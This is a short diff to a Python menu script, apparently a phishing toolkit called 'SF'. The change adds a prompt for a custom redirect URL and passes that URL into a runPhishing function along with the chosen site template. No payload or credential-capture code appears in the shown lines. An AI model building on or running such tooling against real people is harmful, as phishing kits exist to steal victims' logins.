@@ -35,8 +35,14 @@ def main():
         for x in range(8, 12):
             print(cyan('\n [' + str(x) + '] ' + site[str(x)]))
     option = input(cyan('\n SF > '))
+    print(cyan("\n Insert a custom redirect url: "))
+    custom = input(cyan('\n SF > '))
+    if '://' in custom:
+        pass
+    else:
+        custom = 'http://' + custom
     loadModule(site[option])
-    runPhishing(site[option])
+    runPhishing(site[option], custom)
 
 if __name__ == "__main__":
     try:
